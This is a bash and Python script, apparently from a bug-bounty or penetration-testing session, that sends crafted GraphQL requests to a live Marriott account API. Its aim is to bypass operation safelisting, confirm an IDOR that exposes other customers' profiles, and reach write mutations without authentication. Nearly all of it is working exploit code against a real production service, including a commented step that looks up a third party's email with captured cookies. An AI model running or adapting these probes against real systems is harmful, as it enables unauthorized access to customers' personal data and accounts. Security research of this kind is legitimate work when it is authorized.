#!/usr/bin/env bash
# Session 24b — LookupCustomerProfiles + Mutation bypass deep-dive
# Goal: Confirm LookupCustomerProfiles returns cross-user data (IDOR path)
#       + map mutation variable signatures
# Date: 2026-06-25
# No set -u (avoids unbound variable error on $customerId in echo strings)

set -eo pipefail
mkdir -p /tmp/s24b /tmp/s24b/chunks

ENDPOINT_BASE='https://auth-apc.marriott.com/mi/query/'
MY_CUST_ID='580EF43FAD482F46B04E29FE433CC4828.U1'

echo "========================================================"
echo "SESSION 24b — LookupCustomerProfiles + Mutation bypass"
echo "========================================================"

# ---------------------------------------------------------------
# PHASE A: Download chunk file to extract real variable signatures
# ---------------------------------------------------------------

echo ""
echo "======== PHASE A: Download graphql-chunk ========"
echo ""

if [ -f "/tmp/s24b/chunks/graphql-chunk.js" ]; then
    echo "Chunk already downloaded ($(wc -c < /tmp/s24b/chunks/graphql-chunk.js) bytes)"
else
    echo "Downloading graphql-chunk..."
    curl -s 'https://auth-apc.marriott.com/mi-assets/web-rel-26.6.1-5d80cc6-11089/_next/static/chunks/graphql-chunk-793e1a2cf24c51e7.js' \
      -o /tmp/s24b/chunks/graphql-chunk.js
    echo "Downloaded: $(wc -c < /tmp/s24b/chunks/graphql-chunk.js) bytes"
fi

echo ""
echo "--- A1: Extract LookupCustomerProfiles full query ---"
python3 << 'PYEOF'
import re

with open("/tmp/s24b/chunks/graphql-chunk.js","r", errors="replace") as f:
    content = f.read()

idx = content.find("LookupCustomerProfiles")
if idx == -1:
    print("LookupCustomerProfiles not found in chunk!")
else:
    # Find the start of the operation (look backwards for "query" or the opening of the string)
    start = max(0, idx - 500)
    end = min(len(content), idx + 3000)
    snippet = content[start:end]
    print("=== LookupCustomerProfiles context ===")
    print(snippet)
    with open("/tmp/s24b/lookup-context.txt","w") as out:
        out.write(snippet)
    print("\nSaved to /tmp/s24b/lookup-context.txt")
PYEOF

echo ""
echo "--- A2: Extract mutation variable signatures ---"
python3 << 'PYEOF'
import re

with open("/tmp/s24b/chunks/graphql-chunk.js","r", errors="replace") as f:
    content = f.read()

mutations_to_find = [
    "UpdateCustomerConsents",
    "RegisterPromotion",
    "UpdateCustomerPaymentMethod",
    "AddGiftCard",
    "ManageGiftCard",
]

for mut in mutations_to_find:
    idx = content.find(mut)
    if idx == -1:
        print(f"{mut}: NOT FOUND in chunk")
        continue
    # Find surrounding context - look for the mutation keyword
    start = max(0, idx - 300)
    end = min(len(content), idx + 2000)
    snippet = content[start:end]
    # Extract the variable declaration
    var_match = re.search(r'mutation\s+\w+\s*(\([^)]+\))', snippet)
    if var_match:
        print(f"{mut}: {var_match.group(1)}")
    else:
        # Show raw snippet to find the signature manually
        print(f"{mut}: [variable pattern not found — raw snippet below]")
        print(snippet[:400])
    print()
PYEOF


# ---------------------------------------------------------------
# PHASE B: LookupCustomerProfiles — schema + argument exploration
# (all unauthenticated — bypass mode only)
# ---------------------------------------------------------------

echo ""
echo "======== PHASE B: LookupCustomerProfiles exploration ========"
echo ""

OP_LOOKUP='phoenixAccountLookupCustomerProfiles'
EP_LOOKUP="${ENDPOINT_BASE}${OP_LOOKUP}"

echo "--- B1: Probe LookupCustomerProfiles return type via __typename ---"
echo "(Even with 1012100 or GraphQL errors, the TYPE NAME reveals what it returns)"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Probe 1: $query: String (already confirmed bypass works)
payload = {
    "operationName": op,
    "variables": {"query": "test@test.com"},
    "query": f"query {op}($query: String) {{ {op}(query: $query) {{ __typename }} }}"
}
with open("/tmp/s24b/lookup-b1.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24b/lookup-b1.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"], capture_output=True, text=True)
print(f"B1 ($query: String, query used as field arg):\n{r.stdout}\n")
with open("/tmp/s24b/lookup-b1-out.txt","w") as f:
    f.write(r.stdout)
PYEOF

echo ""
echo "--- B2: Probe - try lookup as root-level resolver (not customer-scoped) ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Try: the operation might be a root query that returns [Customer] directly
# If LookupCustomerProfiles(query: $query) returns Customer objects, that's IDOR
payload = {
    "operationName": op,
    "variables": {"query": "test@test.com"},
    "query": f"query {op}($query: String) {{ lookupCustomerProfiles(query: $query) {{ __typename id }} }}"
}
with open("/tmp/s24b/lookup-b2.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24b/lookup-b2.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"], capture_output=True, text=True)
print(f"B2 (lookupCustomerProfiles root resolver):\n{r.stdout}\n")
with open("/tmp/s24b/lookup-b2-out.txt","w") as f:
    f.write(r.stdout)
PYEOF

echo ""
echo "--- B3: Probe variable signature variants for LookupCustomerProfiles ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Test different variable signatures to find which one the registered op uses
# "BYPASS WORKS" = GRAPHQL_VALIDATION_FAILED (passed safelisting)
# "BLOCKED" = FORBIDDEN (signature mismatch)

sigs = [
    # (label, variables_dict, query_string)
    ("$query: String only",
     {"query": "test"},
     f"query {op}($query: String) {{ __typename }}"),
    ("$query: String! (required)",
     {"query": "test"},
     f"query {op}($query: String!) {{ __typename }}"),
    ("$customerId: ID! + $query: String",
     {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "query": "test"},
     f"query {op}($customerId: ID!, $query: String) {{ __typename }}"),
    ("$email: String",
     {"email": "test@test.com"},
     f"query {op}($email: String) {{ __typename }}"),
    ("$searchInput: String",
     {"searchInput": "test"},
     f"query {op}($searchInput: String) {{ __typename }}"),
    ("$loyaltyId: String",
     {"loyaltyId": "845440472"},
     f"query {op}($loyaltyId: String) {{ __typename }}"),
    ("$loyaltyId: ID!",
     {"loyaltyId": "845440472"},
     f"query {op}($loyaltyId: ID!) {{ __typename }}"),
    ("$firstName: String, $lastName: String",
     {"firstName": "Test", "lastName": "Tester"},
     f"query {op}($firstName: String, $lastName: String) {{ __typename }}"),
]

for (label, vars_dict, query_str) in sigs:
    payload = {"operationName": op, "variables": vars_dict, "query": query_str}
    with open("/tmp/s24b/lookup-sig-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24b/lookup-sig-probe.json"],
        capture_output=True, text=True, timeout=15)
    body = r.stdout

    if "FORBIDDEN" in body or "signature mismatch" in body:
        status = "BLOCKED"
    elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" in body:
        status = "BYPASS — var declared+unused (safelisting passed!)"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        status = f"BYPASS — GraphQL error: {body[:120]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        status = "BYPASS + DATA REACHED UPSTREAM (1012100)"
    elif "Cannot query field" in body:
        status = "BYPASS — reached GraphQL engine (field error)"
    else:
        status = f"OTHER: {body[:120]}"

    print(f"  [{label}]: {status}")

print("\nBYPASS result = safelisting check passed with that variable signature")
print("BLOCKED result = safelisting check failed = that var sig is NOT registered")
PYEOF

echo ""
echo "--- B4: Authenticated LookupCustomerProfiles test ---"
echo "REQUIRES: fresh cookie capture from www.marriott.com."
echo "If you have a fresh cs.txt cookie file, run this next block."
echo "Otherwise skip to Phase C."
echo ""
echo "# Command to run when you have cookies:"
echo "# python3 << 'PYEOF'"
echo "# import json"
echo "# op = 'phoenixAccountLookupCustomerProfiles'"
echo "# # SUBSTITUTE the correct variable sig from B3 results above"
echo "# json.dump({"
echo "#   'operationName': op,"
echo "#   'variables': {'query': 'john.doe@gmail.com'},"
echo "#   'query': f'query {op}(\$query: String) {{ lookupCustomerProfiles(query: \$query) {{ __typename id profile {{ name {{ givenName familyName }} }} }} }}'"
echo "# }, open('/tmp/s24b/lookup-auth.json','w'))"
echo "# PYEOF"
echo "# curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountLookupCustomerProfiles' \\"
echo "#   -H 'content-type: application/json' \\"
echo "#   -H 'application-name: account' \\"
echo "#   -b @/tmp/YOUR-COOKIE-FILE.txt \\"
echo "#   -d @/tmp/s24b/lookup-auth.json \\"
echo "#   -w '\nHTTP %{http_code} | %{size_download}B'"


# ---------------------------------------------------------------
# PHASE C: Mutation bypass — confirm schema fields exist
# (confirms write access bypass without executing real writes)
# ---------------------------------------------------------------

echo ""
echo "======== PHASE C: Mutation bypass field enumeration ========"
echo ""

echo "--- C1: UpdateCustomerConsents — find real variable signature ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountUpdateCustomerConsents"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"
cid = "580EF43FAD482F46B04E29FE433CC4828.U1"

sigs = [
    ("$customerId: ID!",
     {"customerId": cid},
     f"mutation {op}($customerId: ID!) {{ __typename }}"),
    ("$customerId: ID!, $consents: [ConsentInput!]!",
     {"customerId": cid, "consents": []},
     f"mutation {op}($customerId: ID!, $consents: [ConsentInput!]!) {{ __typename }}"),
    ("$customerId: ID!, $consentData: ConsentData",
     {"customerId": cid, "consentData": {}},
     f"mutation {op}($customerId: ID!, $consentData: ConsentData) {{ __typename }}"),
    ("$customerId: ID!, $consentsInput: ConsentsInput!",
     {"customerId": cid, "consentsInput": {}},
     f"mutation {op}($customerId: ID!, $consentsInput: ConsentsInput!) {{ __typename }}"),
    ("$input: UpdateConsentsInput!",
     {"input": {}},
     f"mutation {op}($input: UpdateConsentsInput!) {{ __typename }}"),
]

for (label, vars_dict, query_str) in sigs:
    payload = {"operationName": op, "variables": vars_dict, "query": query_str}
    with open("/tmp/s24b/mut-sig-probe.json","w") as f:
        json.dump(payload, f)
    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24b/mut-sig-probe.json"],
        capture_output=True, text=True, timeout=15)
    body = r.stdout

    if "FORBIDDEN" in body or "signature mismatch" in body:
        status = "BLOCKED"
    elif "never used" in body:
        status = "BYPASS (var declared+unused)"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        status = f"BYPASS — schema error: {body[:120]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        status = "BYPASS + upstream reached"
    else:
        status = f"OTHER: {body[:120]}"
    print(f"  [{label}]: {status}")
PYEOF

echo ""
echo "--- C2: RegisterPromotion — find real variable signature ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountRegisterPromotion"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"
cid = "580EF43FAD482F46B04E29FE433CC4828.U1"

sigs = [
    ("$customerId: ID!",
     {"customerId": cid},
     f"mutation {op}($customerId: ID!) {{ __typename }}"),
    ("$customerId: ID!, $promotionCode: String!",
     {"customerId": cid, "promotionCode": "TEST"},
     f"mutation {op}($customerId: ID!, $promotionCode: String!) {{ __typename }}"),
    ("$customerId: ID!, $promotionId: ID!",
     {"customerId": cid, "promotionId": "TEST"},
     f"mutation {op}($customerId: ID!, $promotionId: ID!) {{ __typename }}"),
    ("$input: PromotionRegistrationInput!",
     {"input": {}},
     f"mutation {op}($input: PromotionRegistrationInput!) {{ __typename }}"),
    ("$customerId: ID!, $promotionCode: String!, $revisionToken: String",
     {"customerId": cid, "promotionCode": "TEST", "revisionToken": ""},
     f"mutation {op}($customerId: ID!, $promotionCode: String!, $revisionToken: String) {{ __typename }}"),
]

for (label, vars_dict, query_str) in sigs:
    payload = {"operationName": op, "variables": vars_dict, "query": query_str}
    with open("/tmp/s24b/mut-promo-probe.json","w") as f:
        json.dump(payload, f)
    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24b/mut-promo-probe.json"],
        capture_output=True, text=True, timeout=15)
    body = r.stdout

    if "FORBIDDEN" in body or "signature mismatch" in body:
        status = "BLOCKED"
    elif "never used" in body:
        status = "BYPASS (var declared+unused)"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        status = f"BYPASS — schema error: {body[:120]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        status = "BYPASS + upstream reached"
    else:
        status = f"OTHER: {body[:120]}"
    print(f"  [{label}]: {status}")
PYEOF


# ---------------------------------------------------------------
# PHASE D: __typename breadth mapping (Chain 5 re-run with fix)
# ---------------------------------------------------------------

echo ""
echo "======== PHASE D: Top-level resolver breadth mapping ========"
echo ""

python3 << 'PYEOF'
import subprocess, json

endpoint = 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
cust_id  = '580EF43FAD482F46B04E29FE433CC4828.U1'

top_level_fields = [
    "customer",
    "viewer",
    "me",
    "account",
    "member",
    "user",
    "session",
    "loyaltyMember",
    "bonvoyMember",
    "phoenix",
]

print("Testing top-level resolver fields via bypass + __typename:")
print("")

for field in top_level_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cust_id, "startYear": 2026},
        "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { " + field + "(id: $customerId) { __typename } }"
    }
    with open("/tmp/s24b/typename-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", endpoint, "-H", "content-type: application/json",
         "-H", "application-name: account", "-d", "@/tmp/s24b/typename-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if "Cannot query field" in body:
        print(f"  {field}: DOES NOT EXIST at root")
    elif "__typename" in body and "data" in body:
        print(f"  {field}: RESOLVES to type! Response: {body[:200]}")
    elif "1012100" in body or "UNAUTHORIZED" in body:
        print(f"  {field}: EXISTS (resolver reached, upstream rejected auth)")
    elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" in body:
        print(f"  {field}: BYPASS passed — field itself is wrong: {body[:100]}")
    else:
        print(f"  {field}: OTHER: {body[:100]}")
PYEOF


echo ""
echo "======== SESSION 24b COMPLETE ========"
echo ""
echo "=== KEY EVIDENCE FILES ==="
echo "  /tmp/s24b/lookup-context.txt  — LookupCustomerProfiles query body from chunk"
echo "  /tmp/s24b/lookup-b1-out.txt   — B1 lookup resolver probe"
echo "  /tmp/s24b/lookup-b2-out.txt   — B2 lookup root resolver probe"
echo ""
echo "=== DECISION GUIDE ==="
echo ""
echo "If Phase A chunk download succeeds and shows LookupCustomerProfiles variable sig:"
echo "  → Re-test bypass B3 with the EXACT registered variable signature"
echo "  → If bypass works with real sig: LookupCustomerProfiles safelisting is bypassable"
echo ""
echo "If B3 shows any BYPASS result for a signature with multiple vars:"
echo "  → Next: test with cookies (auth) to see if real search results come back"
echo "  → If search returns OTHER users: IDOR CONFIRMED — CRITICAL finding"
echo ""
echo "If C1/C2 show BYPASS + upstream reached (1012100):"
echo "  → Mutation bypass is FULLY confirmed with correct variable signature"
echo "  → Severity upgrade: M022 CVSS from 4.3 to 5.4+ (adds I:L)"
echo ""
echo "Paste all output here for analysis."
